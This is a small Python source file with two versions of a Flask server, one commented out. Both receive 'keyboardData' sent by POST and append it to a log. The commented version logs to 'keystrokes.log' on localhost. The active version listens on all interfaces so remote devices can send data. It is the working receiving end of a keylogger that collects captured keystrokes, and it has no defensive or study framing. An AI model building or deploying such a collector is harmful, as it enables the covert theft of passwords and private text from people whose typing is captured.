


# from flask import Flask, request
# import datetime
# import os

# app = Flask(__name__)

# LOG_FILE = "keystrokes.log"

# if not os.path.exists(LOG_FILE):
#     with open(LOG_FILE, "w") as f:
#         f.write("----- Keystroke Logs -----\n")

# @app.route("/", methods=["POST"])
# def receive_data():
#     data = request.get_json()
#     keystrokes = data.get("keyboardData", "")
#     if keystrokes:
#         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
#         with open(LOG_FILE, "a") as f:
#             f.write(f"[{timestamp}] {keystrokes}\n")
#         print(f"[+] Logged: {keystrokes}")
#     return "OK", 200

# if __name__ == "__main__":
#     app.run(host="127.0.0.1", port=8080)   # only on local machine



# server.py
from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["POST"])
def log_data():
    data = request.get_json()
    if data:
        with open ("logs.txt","a") as f:
            f.write(data['keyboardData']+"\n")
        print(f"[+] Logged: {data['keyboardData']}")
    return "OK"

if __name__ == "__main__":
    # Run Flask server on all interfaces (so other devices can reach it)
    app.run(host="0.0.0.0", port=8080)
